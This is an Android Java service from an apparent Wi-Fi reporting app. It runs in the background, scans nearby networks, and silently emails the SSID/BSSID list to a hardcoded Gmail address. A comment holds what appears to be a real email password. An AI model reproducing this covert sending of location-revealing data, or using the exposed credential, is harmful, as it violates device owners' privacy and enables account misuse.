package co.volp.wifi_reporter;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import java.util.List;

public class ScanService extends Service {


    public ScanService() {
    }

    public String wifiNetworks;

    @Override
    public IBinder onBind(Intent intent) {
        Log.v("Service", "IBinder Called");
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override

    public int onStartCommand(Intent intent,int flags,int startId)
    {
        //Start Service
        Log.v("Service", "Starting Service");

            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                public void run() {
                    wifiScan();
                }
            }, 1000);

        return START_STICKY;
    }
    public void onDestroy()
    {
        super.onDestroy();
        Toast.makeText(this,"Service Stopped", Toast.LENGTH_LONG).show();
    }


    public void wifiScan() {
        WifiManager mainWifiObj;
        mainWifiObj = (WifiManager) getSystemService(Context.WIFI_SERVICE);

        WifiScanReceiver wifiReceiver = new WifiScanReceiver();
        registerReceiver(wifiReceiver, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));

        List<ScanResult> wifiScanList = mainWifiObj.getScanResults();

        wifiNetworks = wifiScanList.toString();

        for (ScanResult result: wifiScanList){

            Log.v("Scan Results",result.SSID.toString()+","+result.BSSID.toString());
        }
        //Launch Database
        databaseHelper wifidatabase = new databaseHelper(getApplicationContext());
        Log.v("Test", wifidatabase.toString());

        sendEmail("Wifi Networks",wifiScanList.toString());

    }

    class WifiScanReceiver extends BroadcastReceiver {
        public void onReceive(Context c, Intent intent) {
        }
    }


    public void sendEmail(String email_subject, String email_body) {
        Mail m;
        //m = new Mail("vumx@outlook.com", "ZzTEBiUxcURMEAc9");
        m = new Mail();
        String[] toArr = {"9212227@gmail.com"}; // This is an array, you can add more emails, just separate them with a coma
        m.setTo(toArr); // load array to setTo function
        m.setFrom("zemix3@yahoo.com"); // who is sending the email
        m.setSubject(email_subject);
        m.setBody(email_body);

        try {
            //m.addAttachment("/sdcard/myPicture.jpg");  // path to file you want to attach
            if(m.send()) {
                // success
                //Toast.makeText(MainActivity.this, "Email was sent successfully.", Toast.LENGTH_LONG).show();
                Log.v("Background Email", "Email Sent");
            } else {
                // failure
                //Toast.makeText(MainActivity.this, "Email was not sent.", Toast.LENGTH_LONG).show();
                Log.v("Background Email", "Email Failed");
            }
        } catch(Exception e) {
            // some other problem
            //Toast.makeText(MainActivity.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show();
            Log.v("Background Email", "Email Failed in a worse way");
            e.printStackTrace();
        }

    }

    // Define the variables for the database
    public final String database_name = "storedwifireports.db";
    public final String table_name = "networks";
    public final String column_id = "_id";
    public final String column_timestamp = "timestamp";
    public final String column_ssid = "ssid";
    public final String column_essid = "essid";
    public final String column_security = "security";
    public final int database_version = 1;


    class databaseHelper extends SQLiteOpenHelper {
        databaseHelper(Context context)
        {
            super(context, database_name, null, database_version);
            Log.v("Database","Database grabbed Success!");
        }

        public void onCreate(SQLiteDatabase db)
        {
            try
            {
                db.execSQL("create table networks (_id integer primary_key autoincrement, timestamp varchar(255), ssid varchar(255), essid varchar(255), security varchar(255));");
                Log.v("Database","Database Created Success!");
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)
        {
            try
            {
                db.execSQL("drop table if exists networks");
                onCreate(db);
            } catch (Exception e){
                e.printStackTrace();
            }
        }
    }

}